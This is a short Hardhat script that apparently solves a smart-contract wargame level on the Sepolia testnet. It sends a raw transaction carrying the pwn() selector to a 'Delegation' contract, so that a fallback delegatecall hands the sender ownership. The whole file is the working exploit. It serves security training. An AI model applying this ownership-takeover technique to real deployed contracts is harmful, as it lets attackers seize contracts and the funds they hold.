require("dotenv").config();
const hre = require("hardhat");

const DELEGATION_CONTRACT = "0x251bbDB530D99dE0E4257D8fA7e0368E5Cb24D9b"

const ABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_owner",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "pwn",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

const main = async () => {
	const provider = new hre.ethers.providers.JsonRpcProvider(process.env.ALCHEMY_SEPOLIA_URL)
	const signer = new hre.ethers.Wallet(process.env.SEPOLIA_PK, provider)
	const contract = new hre.ethers.Contract(DELEGATION_CONTRACT, ABI, signer)

	const iface = new hre.ethers.utils.Interface(ABI)
	await signer.sendTransaction({gasLimit: 500000, to: DELEGATION_CONTRACT, data: iface.encodeFunctionData("pwn()") })
}

main()
	.then()
	.catch(error => {
		console.error(error)
		process.exit(1)
	});
